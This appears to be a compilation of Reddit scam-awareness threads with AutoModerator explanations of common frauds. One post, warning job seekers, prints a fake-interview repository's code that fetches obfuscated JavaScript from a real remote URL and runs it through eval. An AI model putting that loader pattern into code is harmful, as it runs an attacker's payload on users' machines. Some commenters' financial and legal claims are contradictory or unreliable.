I figured out who the culprit was because he used my Sprint email to set join a forum and upload the creepy pic. He had set up the email account for me. He is the only tech bro I know who was dumb enough to use 123456 as his password on everything. This was 15 years ago. Revenge porn had only just become illegal.

It was all horrifying enough that my God I couldn't even IMAGINE sitting in front of my male lawyer and dealing with this if it had actually been a real picture of me.
- But you were still right that OP was a victim & the scammers are predators, even if OP wasn't underage.

- Nobody legitimate wants to make your puppy an Internet superstar.  That's just not a thing.
- Yea it's a scam. They'll make you pay their products plus shipping at a exorbitant price. Posting your puppy's pic on their profile means nothing. It just indirectly means you fell for their scam

Report and block them.

- Hi /u/YourUsernameForever, AutoModerator has been summoned to explain the Influencer scam.

This is a dishonest marketing technique where a user will reach out to you on a social media platform, usually Instagram, and offer you the chance to work with or promote a brand. Sometimes the main brand account will reach out to you, but other times a fresh account will message you and direct you to contact the main account. Working with the brand will involve buying their products, though you may be offered a discount.

This technique is usually used by dropshipping sites that sell items from Aliexpress at inflated prices, so even with the discount they will make money from your order. This is simply a marketing technique sent to many people at once to get people to order from their site, so if you receive a message like this all you need to do is ignore it.

Title: I was scammed out of 300 dollars in cryptocurrency, any chance of the scammer getting caught?
Body: The scam was done by one person, with no website or anything official‚Äîit was very unprofessional. I think another person might have been scammed for about $200 as well because there‚Äôs a similar transaction linked to their wallet.

If this gets investigated, how long would it take? Also, where should I report it? Should I go to the police, or is there somewhere else that deals with these kinds of scams?

Finally, is there any chance I‚Äôll get my money back? Since it seems like a poorly done but hard-to-trace scam, I‚Äôm not sure if recovery is even possible.

- Probably not. They are professionals. Beware of recovery scammers who may come your way, promising to get the money back. 

Count your blessings, you caught on fast. Some people on this subreddit have lost tens of thousands of dollars, sometimes in the hundreds of thousands.

Sorry that happened to you! Now you know how good they are at scamming people and you can prevent it from happening again.
- You can report it to the FBI, but there are literally thousands of people in the line ahead of you - many of whom lost tens to hundreds of thousands. There are even reports of people losing millions of dollars to crypto scams. Your case simply won't get priority - it's unlikely that it will ever get investigated.

Best thing to do is consider it the price of a lesson. The entire crypto landscape is now covered wall-to-wall with scammers. You will need to be on the highest alert if you plan to trade. Don't trust anyone. Don't believe people who say they can deliver outrageous profits. If you plan to invest in crypto, treat it like any other investment - buy, hold, and know that returns are not guaranteed, and anyone who says otherwise is trying to scam you.
- No, no and no.
- Your money is gone. Scammer won't get caught since they're probably over seas. Anyone telling you they can get your money back is trying to scam you. Take this as a lesson and move on.
- Be glad you ONLY lost $300 fucking around with crypto and take it as a lesson.
- What if both of us report it? (other victim)
- So there is absolutely zero chance he will get caught? What if we live in the same country?
- Zero times zero is still zero
- It doesn't matter. It's unfortunate but many people are in your shoes and they will never see the money or see their scammer held accountable.

Watch Scammer Payback on YouTube. You will see how complex the scammer world is and that they are very good at what they do.
- Putting aside feasibility, I can‚Äôt imagine authorities would be terribly interested in pursuing your case because you got scammed out of very little money. Don‚Äôt get me wrong, a couple hundred dollars makes a huge difference in a lot of peoples‚Äô lives, but it‚Äôs not that significant on a wider scale
- Think it through. Crypto is not traceable. It's under $500 so even if you could prove it and a judge hears it, it's small claims court at best. You'll pay more than you lost in legal fees just getting the case going. Do you know the person in real life? Or was it through discord/telegram/Whatsapp? If you did not meet the person in real life, chances are you aren't talking to someone in your own country no matter what they say.
- Zero
- You have to put it through a centralized exchange linked to KYC to cash it out.
- There is no centralized exchange for you to cash out of. They took your $300 and promised you profits then bailed with it. There were no profits to begin with. All of this was a scam.
- The scammer is in a country that doesn't prosecute scammers, that country also probably doesn't have as stringent of banking laws.

Also they can just buy goods with the bitcoin and launder the money, just like they could launder cash. Tracing it is possible, but not easy. No agency is doing it for $300
- To get cash from crypto you need to put it through a centralized exchange, like bybit or coinbase.
- You're not getting your money back ever.
- If people lose millions in crypto and the scammers get away clean, why would your 300 be more important?
- It's just an exchange - there is nothing "centralized" about it, and you have no way to know what exchange (if any ever) the crypto might go to.
- Based on the other replies, you may be delusional. However if this exchange is so centralized, why aren't you talking to their support about your stolen money? Surely since they're centralized (like a regular bank) they can track the transactions and start a case with their fraud department?
- Clearly you don‚Äôt understand how crypto works. Anyone can see how crypto moves around from wallet to wallet, that information is publicly available on platforms like blockchain explorer and solscan. However it is (nearly) impossible to cash out crypto without sending it to a centralized exchange, which must be linked to a name and ID. Everyone can see that you transferred it to the centralized wallet of the exchange for that coin. The reason it‚Äôs centralized is that you never actually hold the crypto, the exchange holds it on your behalf.
- >Clearly you don‚Äôt understand how crypto works.

Clearly I understand it better than you.  That's part of the reason you were scammed out of your cryptocurrency and I was not.

>Anyone can see how crypto moves around from wallet to wallet, that information is publicly available on platforms like blockchain explorer and solscan.

Correct, but you have no clue where those wallets are located.  They could be on an individual's computer, or their cell phone, or an exchange.  You have no way to know.

>However it is (nearly) impossible to cash out crypto without sending it to a centralized exchange

That's not at all true.  You can buy things with your cryptocurrency, you can exchange it for cash with someone that you know, or you can hold on to it and give it to your kids in your will.

>Everyone can see that you transferred it to the centralized wallet of the exchange for that coin.

Actually NOBODY can see that.  There is no way to know if a wallet is part of an exchange or not.

>The reason it‚Äôs centralized is that you never actually hold the crypto, the exchange holds it on your behalf.

Exchanges are not "centralized" in any way shape or form.
- Dude everyone here is telling you you can't get it back. If you are still clinging to hope you are going to get scammed again by recovery scammers because *absolutely nobody can get your money back and it is gone.*

This is like people trying to tell you the magic beanstalk doesn't exist and you're insisting you know more about magic beanstalks than everyone else because you have read Jack and the Giant Beanstalk. And that the magic beans you bought from a hobo are well and truly magic beans. 

Your money is gone. Take this as a lesson and move on.
- My brother in christ, YOU are the one who doesn't understand.
- He transferred it to ByBit. Anyone can see that as most exchange have one or two wallets where all their customers holdings of a coin are held.

Exchanges are very centralized, look it up. Funds are held in wallets controlled by the exchange, not by you.

- OP, I'm not trying to be a jerk here, but here are some red flags to look for.

[https://www.trustpilot.com/review/ruannow.com](https://www.trustpilot.com/review/ruannow.com)

Terrible reviews

Same product being sold in dozens of dodgy places

No physical address, no phone number, no hours, just an email.

And finally, no one is doing 95% off. That's always a red flag.
- >hey have customer support/track your order/refund policy/retubr etc etc

You have NO idea how easy it is to make all that up. It's usually just a copy/paste from another site. Probably one person owns the site under an assumed identity, all the emails go to him...and so does the money. He ain't gonna refund it.
- Contact your bank and report the charge/s as unauthorized.
- This site has been  mentioned here before,  not favorably.

- Well thank you for replay at least i learned my lesson
- No worries i was just being stupid.I checked reviews after i ordered.
- Isn't there a policy or some rules you need to follow or have certificates to put like that info on site.I though like you cannot just copy and pasted it

Title: How do scams with underpriced items on Facebook work?
Body: I come across items on fb marketplace that are usually highly sought after within certain communities. These things are marketed at insanely low prices. Like a $1500 espresso machine that is very popular within the community, being sold for $300. 

What typically reaffirms to me that it's a scam is that the account is brand new (2024/2025) and has no info on it. 

What I'm curious about is what the actual scam is? I've never gotten far enough through the process, but I had a friend who was about to meet up with someone for a Dyson Air wrap but bailed after the guy delayed the meetup, as the vibes were overall off. Never asked for up front payment which would be my obvious thought.

So again, haven't ever gone far enough along to learn how they rip you off. Anyone encounter this and know? This is purely for curiosity

- They will want a deposit for an item you will never get.
- The subtle scams are that they don't ask for deposits but they make it difficult for you to come see or pick up the items (Like they're currently out of town and will be back a week or two or make up other reasons why they can't meet). They're hoping that the FOMO of the victims would make them offer to send deposit to hold the item. Once deposit is made, victim is either ghosted or blocked because there never was an item and any address they provide is fake/not theirs.
- Usually they ask you to send payments buy some untraceable methods then when they get the money they delete the account and make new ones
- There is no espresso machine. Only the scammer.  
Your friend did not fall for the scam.  So the scammer kept putting him off.  
Sometimes they agree to a meetup but give a random  address.
- Classic !advancefee scam.

Pay for shipping/item, never get anything.
- It‚Äôs wild how these scammers operate! üò± A lot of times, they won‚Äôt ask for money upfront but will ask for a deposit to "hold" the item, and then vanish once they get it. 

Be careful, especially if they make it hard for you to meet in person or use untraceable payment methods. 

Always trust your instincts and meet in public, safe places!
- They didn't ask for money upfront, it's ppl that just want it gone and aren't good at paypal/ebay.  Sometimes ppl buy dumb shit they can't afford at tax then shit the mortgage/rent is due. Or they could just be trying to rob you in person.. buy in person at a police station with cash
- Makes sense. It's the subtlety that was confusing me. Scammers progress more every day I guess.
- Makes sense. I also see some that have weird leading numbers/letters in the item name. 

Like _J4BQR- Eames Lounge Chair and Ottoman._ These one are always obvious scams, but I don't understand why they have these leading numbers that make it very clear to me they're scams.

- Hi /u/Dofolo, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

- scam, !task
- Possibly from the same group, because they do mass texting -- the texts are automatically sent to hundreds of numbers each day, and it looks like they don't have quality control in place to remove duplicate numbers. Or, two different scammers with the same script -- those poor ignorant scammers, don't realize that someone else is running their same scam.

People will fall for this, sadly.

- Hi /u/darknessblades, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- !crypto
- Hi /u/Flaky_Law2653, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

i was being rushed to send money via Zelle by a seller on Facebook market, he sent me a fake lawyers number and even had another "lawyer" text me the same thing rushing me for the money. i asked the seller to use the Zillow application instead, he agreed then when i told him its off market he refused to open it and said i need to use the Zelle

Title: ADDRESS CLARIFICATION SMSHING SCAM TEXT
Body: Got this scam text claiming to be USPS. Normally, I would just delete it immediately. However, the fact that a properly addressed bank statement has recently been returned as undeliverable (resulting in my bank freezing my account until I confirmed my address at the local branch) made me look twice. Now, I'm still getting my mail at my current address and have not been locked out of informed delivery (as happens when there is an address change), so I'm sure that it's a coincidence.

- Coincidence. The !mail scam is probably the most common scam in the world based on how many of these texts are sent out every day. When they send out millions per day, there's going to be all kinds of coincidences that go along with that.
- Most scams work with urgency and timing.  If the "Sheriff" calls you an hour after you slept in and actually missed jury duty, you are more likely to fall for the scam than if you never knew you even had jury duty.
- The coincidence is the only reason I posted it. I figured I wouldn't be the only person who has had this coincidence and wanted it to be a warning if anyone else got a similar coincidence. I also know about the scam where people would file false change of address forms.
- Hi /u/teratical, AutoModerator has been summoned to explain the USPS or Mail scams scam.

Mail scams (USPS, FedEx, UPS, etc.) are notices sent to your phone or email, claiming that a package has failed to be delivered to your home. The text or email tells you that you need to provide more information or customs fees to receive the package. These scams are phishing for your personal information, financial information, or password for the mail service‚Äôs website, or can be trying to get you to pay up front for a service you will never receive. Sometimes the charge is less than a dollar and victims will brush it off, even when realizing they've been scammed. The scammers are not looking to get a dollar out of you, but instead they just stole your credit card details.

If you entered your card details in a website such as this, and submitted the form, even if it said that the transaction failed and to try again with a different card, it doesn't matter: they already stole your card details. You need to call your bank and report the card stolen, and ask the bank representative to disable the automatic account updater service when issuing the new card.

Pay close attention to the specific links you receive, as they will not go to the true website for these mail services. Only enter your information when visiting the mail service‚Äôs website directly. For example: USPS only works with usps.com

Title: Job Scam: International Products Inc. Imposter
Body: Hello all! Recently encountered a more elaborate job scam than what I've seen before. I wanted to post here in case anyone is in a similar position with the same fraudsters.

**For clarification the real International Products Inc. company is in no way affiliated. They are just the identity these scammers are impersonating**

I applied to a listing for a remote proofreader position. I was initially contacted from an email with the company domain as used elsewhere on the real website which afforded them the mild credibility I gave it initially. But after some back and forth, a rudimentary google form, and no interview, I was presented with a 'offer of employment' and a contact to reach out to outside of the company domain. After reaching out to said 'supervisor' they outlined the check scam under the guise of a 'new equipment' stipend. They needed me to receive a scan of their check, deposit it via my mobile bank app, and pay their 'vendor' for the equipment- but I should do it right away to avoid any wait despite the check needing 3-7 days to clear. lol.

Anyways I alerted the real company and they confirmed no such position exists, etc. Good luck out there y'all.

- Thanks for posting, hopefully it will help others. 

This is a common job scam, posted here several times a week. More details for anyone else who hasn't heard of this: No job exists, they just want to steal your money.  Real companies who hire remote workers set up computers and software, and deliver them to the new employee at the company's expense. It's a variety of !fakecheck scam.
- There is no such thing as a remote proofreader job, especially for some industrial manufacturing company. That type of thing will always be a scam. 

It's not 1975. Virtually all proofreader jobs are long gone. The teeny tiny fraction that may be left is highly specialized work with people with niche experience. Most of that work is like 5% of some other job.
- >despite the check needing 3-7 days to clear.

If you had deposited the fake check they wanted to foist on you, your bank might have after a few days released the funds into your account, in accordance with banking regulations.  But, your bank could have, and certainly would have, reversed the deposit even if months elapsed before they concluded that the check was fraudulent.  And, the bank might have closed your account permanently at that point.  Only accept checks from people or institutions with which you have had a long, in-real-life, trusted relationship.
- >  I was initially contacted from an email with the company domain as used elsewhere on the real website

How did they accomplish this? Compromised account at the company?
- I just wanted something with the applicable keywords out there. When I tried to find some mention of this specific operation I didn‚Äôt have any luck. Most fake check or job scams I‚Äôve encountered were relatively rudimentary, was curious to follow this one to its inevitable end. But hopefully someone willing to assume an HR department is just disorganized will find this and save the time.
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.


**
- I figured it was probably fraudulent from the get for a few reasons, but I wanted to see how far it would go. I‚Äôve never seen one organized enough to be spoofing the company domain correctly. After talking to an actual representative they believed the real employee that the scammers were impersonating had her email compromised.
- So this is the puzzling part & why I wanted to see it through. I honestly have no clue and my only guess is the same as yours. I‚Äôm sure spoofing it isn‚Äôt impossible, but phishing sounds more likely for the skill set of the average scammer.
- Got a screenshot? Where do the links go, as if they asked you to reply they wouldn't get the message if spoofed. 

Spoofing would also fail against providers with the security of Gmail.
- Yeah I can get one, I was going to include one but I didn‚Äôt know if it would break the rules.

We had a consistent back and forth before they passed me along to someone else. I figure it was a compromised email because they were blatantly cosplaying as a real employee opposed to the usual completely fake names and credentials.

- The IRS does not communicate via text except for ID.me verification codes
- !whois gov-instructions.com
- gov-instructions.com is not a domain run by the IRS.
- Just so you know for the future, the stuff preceding the "." in front of "gov" is not part of the domain name.  The IRS has nothing to do with it which makes it an obvious and poor attempt at a scam.  Also as others have pointed  out the domain  is only 2 days old.

Also the  US government uses ".gov", not ".com."

The IRS will not communicate with you this way.  If they want to inform you of something, they will send you a letter in the mail.
- This "$1,400 Economic Impact Payment" is going the rounds - probably because tax season is approaching. It's a scam.

The IRS doesn't really go after people in the way you're afraid of, especially people who aren't working and don't have great big investment revenue. If you file your taxes and aren't cheating, an audit isn't likely to be a big deal. They might say you calculated some expense or deduction incorrectly, or similar.

The scammers are counting on fear and confusion about the IRS to panic their victims. The more you can be informed about the IRS, the more secure you'll feel.

EDIT: A small group of taxpayers are indeed going to get a check from the IRS that is from the stimulus bill 4 years ago, if they were overlooked in previous rounds (for various reasons). However, there is nothing you would need to do. If you're eligible, a check is going to arrive; if you're not, you're not.
- lol. That‚Äôs a scam text
- This is a good reminder not to interact with any texts you did not ask for or have a history with the entity.

Myself, I don't do any non-immediate business by text, email only, however the IRS does not email unless you have an account through IDMe which of course you can log into and see what's up.
- Another tell is the specific reference to the Safari browser.   That same reference is used in the scam texts for unpaid tolls and undeliverable packages.
- Actually, this is somewhat real. 

The texts all come through with a different hyperlink that indicates the texts themselves are a scam, but the incentive program is indeed real. 

You just have to use the IRS (dot) gov website, not the link in the text you got.

- the money is gone you aren't getting it back. block the fake lawyer and anyone who is trying to get you give them money.

watch out for !recovery scammers they will dm you and lie saying they can get it back. they will just scam you for more money.
- Your money is gone. You **cannot** get it back. Watch out for !recovery scammers.
- Money is lost.
Don't spend more money to fail to get it back.
Pay off your debts.
- From your description, it is hard to know how many times, and in what ways, you have been scammed, but it is HIGHLY UNLIKELY that you can get ANY of it back, and it is HIGHLY LIKELY that you will be contacted by recovery scammers who will claim that they can help you (but they will just try to steal more of your money).

The money that you lost to what you thought was an "investment" (and only that money) can be deducted from your taxes (talk with a tax accountant about it).


######**Tax write off for failed investments:**

The question is whether the loss was ‚Äúincurred in any transaction entered into for profit‚Äù. IRC 165(c)(2).  The ‚Äúentered into‚Äù language suggests that the focus of the inquiry is on the intent of the taxpayer (ie. why was the transaction entered into), and not on the ultimately fraudulent nature of the transaction.  It seems to me that most victims of pig butchering type scams send money to someone because they intend to make a profit, but instead they lose their investment.  In the end it turned out that it wasn‚Äôt a real investment, but that doesn‚Äôt change the fact that they entered into the transaction for that purpose (ie. the loss was incurred in any transaction entered into for profit).

- >Ever since that lawyer incident around thanksgiving I have not sent any money but they keep reaching out to me.

Of course they do, they made $100k off of you and you repeatedly fell for their scams. Why would they stop?

The chances of getting your money back are very small. If you paid them using a cryptocurrency, it's zero. That's the whole point of crypto: irreversible transactions and accounts that cannot be seized or frozen. If somebody wants you to buy anything using crypto, or send crypto somewhere, they're always trying to scam you. Why else would they require crypto?
- You have to STOP SENDING MONEY.  Absolutely stop.  No one will get this money back for you but TONS of scammers will say they can for a small fee.

You can't get the money back no matter what.  Theres no legal recourse.  Vigilantism is futile.  'hackers' who want to help are scammers.  

You have got to move forward and really use your thinking cap when money is involved.
- How did you lose 100k? How much of that is debt? Sounds like the lawyer you need specializes in bankruptcy
- Sorry, OP. The lost money is gone. Do not fall prey to recovery scammers.
- You really need to explain more. You mention investment, then mention getting ‚Äúcredit cards off you‚Äù

Did you give this money out for investments and then open credit cards to further give money or just to live off of?

Regardless, credit cards is credit. You have to pay that back no matter what. The money you sent(100k) is likely forever gone. You either gave it to some overseas person that scammed you or lost it yourself in an actual stock trading app(like robinhood for example)

You will likely never get that money back. Consider it an investment in never doing that shit again. If you actually want help actual investing(not doubling your money) but a average 7-15% a year, then hit up finance subreddits, but pretty much you‚Äôll just be putting your money into index funds and the like.
- Money is gone. Nobody can magically double your money.
- Any "attempt to get your money back" will either be: A. More scammers, scamming you again. B. A dishonest lawyer, wasting what little resources you have left.

It's gone, I'm sorry. Don't fall victim to the sunk cost fallacy. It's time to accept what happened and do what you can to move forward/on.
- Too many details missing from this post.
- This will address the "doubling it through investing" part of your problems:

You know now that it's a scam, but you don't yet grasp the depth of the scam. You need to understand the total scam, so you don't get scammed again.

**It was a scam from the beginning. There was never any investment. That's why nobody can get the money back for you.** 

Whatever you "invested" is gone. Whatever "profit" you made is a lie. You never made any money. **Any screens they showed you with money earned were made up. It was all lies.**

Anyone who promises to double your money is lying, so they can take money from you. Anyone who promises a 10% or higher return on your investment is a scammer. Stocks, gold, cryptocurrency, whatever it is, promises of a specific return are a lie. 

If you want guaranteed returns, go to a bank, put your money in a savings account or a CD (certificate of deposit, called a term deposit in Canada and UK). US banks are paying 5% per year, or less, on CDs. That is a realistic guarantee. Anything more is most likely a scam.
- You put greed before common sense and this is what happens. Sorry but your money is g o n e gone. Anybody saying they can help is just another scammer.
- You don't get the money back. That's what makes it a scam.
- Good luck. A year is a long time.

Don't know if you'll ever see your gift again .

Hope it wasn't rent or or utility money .

üá∫üá∏ü¶Ö
- You won‚Äôt. The lawyer you have been paying is just another scammer. Anyone else who claims they can get your money back is a scammer. They keep reaching out because of the past scams that you have fallen for and they are hoping for more. Sorry.
- Hi /u/Helostopper, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- Are you sure this actually was the friend, and not that friend's account was taken over by a scammer?

If it genuinely was this person, then you should discuss options with a lawyer to sue them. This would be the only way you could potentially get anything back.

If it was a scammer however, there's no chance to get money back you freely chose to send. Banks do not care if you made a mistake trusting someone; just that your account wasn't hacked or money stolen from you without your knowledge.

 !recovery scammers would love to take more of your money. 

DO understand if your bank tells you they can't/won't help and going the lawyer route isn't workable, then the money is completely gone.
- If you actually have the right person, then that's a question for a solicitor
- Does Australia have something similar to 'small claims court'? It sounds like he defrauded you using false pretenses, but if you sent it to him willingly I'm not sure how that plays out in the Australian legal system, as I'm neither a lawyer or Australian (let alone an Australian Lawyer).

This sounds like something you should get professional legal counsel over, even just to go through pertinent evidence (messages you've exchanged, promises made, efforts to recover funds, etc) and see what the best next step would be. Might there be a reputable firm that will do a consult?

Again, I don't know what standards might apply while seeking such assistance.

Title: Offer Up and Social Media Purchases Scam
Body: Hello good people! 
*OFFERUP SCAM* Be careful on OfferUp and Marketplace especially. Recently, my friend was scammed out of $750 when she bought a pottery kiln on Offer Up. The way the scammers get around purchasers paying on the app--where there are consumer protection-is to create items that weigh 20 lbs plus since OfferUp will handle payment transactions for items up to 20 lbs. 

*PAYMENT* They first asked her to pay via Zelle, but the buyer was not comfortable with that so the sellers offered that she could pay with Paypal. 

*FAKE SHIPPING TRACKING RECEIPT*
these scammers sent the purchasers the screenshot of a UPS receipt. Turns out the receipt was fake; the scammers edited a real UPS receipt and put fake tracking number and fake origin address on it. UPS has opened an investigation. 

*BUYER BEWARE* The buyer is going through the process with Paypal and her credit card company to get her money back. 

I am very sorry for my friend! She is extremely distraught and this has shattered her heart and faith in humanity --not only the scammers but Capital One and Visa refusing to put a hold or stop to a pending fraudulent transaction that they have been informed is fraudulent. They state they have to wait til the transaction goes through in order to engage the dispute process. 

Please beware and send love and light to my dear friend anr these scammers. Apparently scamnees are spiritually bankrupt to be in a such a dark place where they do not operate in abundance. Source always provides--as much as we set our intentions--it all begins with you üôèüèΩ‚ù§Ô∏è

- Well there's your problem, scammers always get you to go off app. If a seller ever wants you to pay outside of the website's normal method, they are scamming you
- Also, no one on offer up is going to ship a pottery kiln. You got to think local unless you're throwing down money at a company.
- Thats right. Thank you for helping explain and bring awareness to scams involving online purchases!

Title: US Standard Scam at my workplace
Body: So I made a little whoopsies at my workplace today. I got a call from a company called US Standard who knew my name and job title so I thought it was legit, yes roast me. I went along with all their BS and now they‚Äôre sending my store (discount tire) a package of stuff. I did this before researching and realizing that they‚Äôre a scam. Is there anything I can do to make sure we do not get billed or am I essentially screwed cuz they have my name, workplace name and our address. And yes I did provide them with a po because I figured it was legit, they were sending us safety glasses and we use a lot of those so I thought it was a vendor who we use.

- Talk to your boss, tell them what happened. They should be able to rescind the po.
- Just inform your boss, they'll end up sending a box of overpriced items you'll end up refusing it or mailing it back to them. It's a hassle but not a big deal.
- Had a similar thing happen in a retail job years ago. Someone called in the evening and spoke to one of the staff as if they were our regular supplier for something and staff member ordered some things. When it arrived the boss told them to arrange for a courier to get their stuff and he wouldn't be paying for it. The box was still in the bosses office when I left a few years later and he never paid for it. 

Best course is to own up to the mistake and let your boss refuse the delivery. No sense in trying to hide it when an invoice will follow shortly behind I'm sure
- Why here and not a convo with the. BOss about it?
- I guess it wasn‚Äôt an actual po. It was a ‚Äújob site number‚Äù is the same
- That‚Äôs what I was wondering. Ive been reading about people just sending the stuff back but I wasn‚Äôt sure if that was still possible since there‚Äôs a ‚Äúpo‚Äù
- Yeabut - potentially they are now so fired if they do!
- Still need to tell them so it doesn't get paid. If you get anything at all, it'll probably be low quality Temu crap that wouldn't protect against an angrily thrown cotton ball.
- After you talk with your boss you can probably notify the company that the PO has been rescinded. A PO doesn't magically make what they're doing more legitimate.

Title: How I've almost been hacked through a seemingly real job offer
Body: Hey everyone!

Reaching out to you to let you know of a little story that I've just gone through. I have been contacted through LinkedIn about a job offer to work for TwentyFour7 (never heard of the company, but just giving out all the detes). All seemed normal, maybe the pay was a bit too high for my experience (12-15k USD for 2 years exp, first red flag), but alas I just send this person a resume. After a few hours they contact me back wanting to schedule an interview (second red flag). All well and good, I use their calendly link to schedule the interview, with the first spot being available tomorrow (third red flag).

After this I started looking at the account to see how real it looked. There was no activity, but there were written endorsements all the way back from 2006, so i though hell, maybe they just don't post that often.

After all of these, and with the red flags that I've collected, they tell me that the technical team will add me to a github project that we will use during the interview, and that I should familiarize myself with the code, and so I did. All this without actually running the code of course. I have started picking through each and every file, but I didn't have to look for long as literally the 2nd file in my whole search contained a line that piqued my interest:

    async function getCookie(params) {
        const res = await axios.get(' https://api.npoint.io/e41c92aff1c017ca7190')
        eval(res.data.cookie)
    }

Now I usually don't use eval in my code, but what I know is that eval runs whatever string you pass onto it, and so I thought this is awkward. The fact that they use axios was not enough, and the code otherwise looks leggit. Most of the axios code just hits into a mocked mirage.js endpoint, but this one doesn't. Going to that URL (the URL is still up as of the time i'm writing this post. If it goes down I can share a copy of the obfuscated code it sends) I find some really obfuscated JS code, all packed into a JSON object under the singular property called "cookie". I tried my best to deobfuscate this but no obfuscator managed to do so, however, github copilot believes that the code does stuff using fs (the filesystem). I couldn't find anything besides this, but if someone is a security expert or an amateur that wants to take a shot, I would be glad to provide more info about this!

I thought about sharing this as in the current context of the Software Engineering/Computer Science job market, where it seems more and more difficult to find a job, people might be intrigued enough to not pay attention and actually get scammed into running one of these seemingly harmless repos for the sake of finding a job. Stay safe out there!

- /u/Eusuntpc - Your post has been queued for moderation because it looks like you included a clickable link. Reddit Admins will remove posts to dangerous websites, so we have to look out for one another.

## The safe way to post about scam websites is:

* Write the website address in the title of your post
* Don't post clickable links in the body text

## So:

* If your post already has a website address in the title: edit the body of your post to remove the clickable link. For example, you can replace a .com with (dot)com - then wait until a moderator comes to take a look and approve this.
* If you didn't put the website address in the title: since titles aren't editable, we encourage you to delete this post, and post again - this time, writing the website in the title of your new post.
* If this post is NOT about a possible scam website: for example, if you tried to share a news article, or a government website, etc - just wait until a moderator comes to take a look and approve this.

- Most likely it just downloads another payload, likely some commercially available info stealing malware. I'm not bored enough to pick through it and find out exactly.

You definitely should report the repo to github.
- You should xpost this to r/cybersecurity
- Try running it in a VM (local like virtualbox) with the internet unplugged.
- Imagine being an unemployed programmer applying for jobs in this terrible market, and get all your crypto and login info stolen.

How would you even explain this to your friends and family and not get laugh at?
They will immediately think in their head "uh aren't you a computer guy? ROFL LMAO" if they don't say it to your face.

